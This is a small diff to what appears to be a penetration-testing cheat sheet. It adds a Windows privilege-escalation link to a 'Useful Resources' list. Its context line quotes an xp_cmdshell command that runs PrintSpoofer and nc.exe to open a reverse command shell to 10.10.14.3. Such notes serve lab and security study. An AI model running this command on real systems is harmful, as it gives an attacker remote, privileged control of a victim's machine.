@@ -1560,6 +1560,8 @@ xp_cmdshell C:\Tools\PrintSpoofer.exe -c "c:\Tools\nc.exe 10.10.14.3 8443 -e cmd
 
 ## Useful Resources
 
+[SwissKeyReo - Windows Privilege Escalation](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation)
+
 [HackTriks](https://book.hacktricks.xyz/)
 
 [WADCOMS](https://wadcoms.github.io/#+SMB+Windows)
